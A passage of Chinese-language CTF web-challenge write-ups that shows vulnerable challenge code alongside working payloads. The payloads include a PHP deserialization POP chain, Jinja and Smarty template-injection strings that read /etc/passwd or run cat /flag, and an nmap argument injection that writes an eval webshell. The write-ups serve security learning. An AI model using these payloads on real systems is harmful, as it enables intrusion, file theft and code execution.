   <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)));</span><br></pre></td></tr></table></figure>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>只允许一个字符，使用unicode</p>
<p>payload</p>
<p>id:4   ↂ</p>
<p>在下面这个网站上搜索<code>ten thousand</code>:</p>
<p><a href="https://www.compart.com/en/unicode/U+2182">“ↂ” U+2182 Roman Numeral Ten Thousand Unicode Character (compart.com)</a></p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>过滤了config,selif,且过滤了括号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有过滤可以直接&#123;&#123;config&#125;&#125;即可查看所有app.config内容</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>flag在phpinfo()里;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a=&#x27;phpinfo()&#x27;;</span><br><span class="line">    public $b=&#x27;eval&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new HelloPhp();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?= @eval($_POST[1]);?&gt; -oG a.phtml &#x27;</span><br></pre></td></tr></table></figure>

<p>连接查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;settings.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>])):</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WEB_SCANS&#x27;</span>)) &#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;Web scans disabled&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$host</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">	<span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">	<span class="variable">$command</span> = <span class="string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="string">&quot; -oX &quot;</span> . RESULTS_PATH . <span class="variable">$filename</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$host</span>;</span><br><span class="line">	<span class="variable">$result_scan</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$result_scan</span>)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: result.php?f=&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入：<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`、<code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符前面都有一个插入符号（<code>^</code>）</p>
<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含<a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>、<a href="https://www.php.net/manual/zh/function.system.php">system()</a> 和<a href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。</p>
<p>在 Windows 上，<strong>escapeshellarg()</strong> 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(<code>\</code>)都会被一个额外的反斜线所转义。</p>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p><img src="https://s3.bmp.ovh/imgs/2023/10/16/52940aa73b70a520.png"></p>
<p>注入</p>
<p>为php smart</p>
<p> {$smarty.version} 可以查当前引擎版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5&#123;*comment*&#125; 5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>下载源码，进行审计学习</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>pin码主要是又6个参数构成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flask所登录的用户名</span><br><span class="line">modname，一般是flask.app</span><br><span class="line">getattr(app, “name”, app.class.name)。一般为Flask</span><br><span class="line">flask库下app.py的绝对路径。这个可以由报错信息看出</span><br><span class="line">当前网络的mac地址的十进制数。</span><br><span class="line">机器的id。</span><br></pre></td></tr></table></figure>

<p>4 getattr(mode,”<strong>file</strong>“,None)  app.py 文件所在路径，可以通过报错拿到，如传参的时候给个不存在的变量</p>
<p>5 str(uuid.getnode())   电脑上的mac 地址十进制,任意文件读 <code>/sys/class/net/eth0/address</code></p>
<p>(1)获取用户名username</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import getpass</span><br><span class="line">username=getpass.getuser()</span><br><span class="line">print(username)</span><br></pre></td></tr></table></figure>

<p>生成username</p>
<p>(2)</p>
<p>获取app对象name属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr（app,&quot;__name__&quot;,type(app).__name__)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">print(getattr(app,&quot;_name__&quot;,type(app).__name__))</span><br><span class="line">获取的是当前app对象的__name__属性</span><br><span class="line">若不存在则获取类的__name__属性，默认为Flask</span><br></pre></td></tr></table></figure>

<p>1<strong>flask所登录的用户名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh</span><br></pre></td></tr></table></figure>

<p>为flaskweb</p>
<p><strong>modname 一般不变就是flask.app</strong></p>
<p>**(3)getattr(app, “*<em>name*<em>”, app.*<em>class*</em>.*<em>name*</em>)。python该值一般为Flask ，值一般不变</em></em></p>
<p><strong>(4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</strong></p>
<p><strong>（5）当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡：</strong><br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/sys/class/net/eth0/address&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

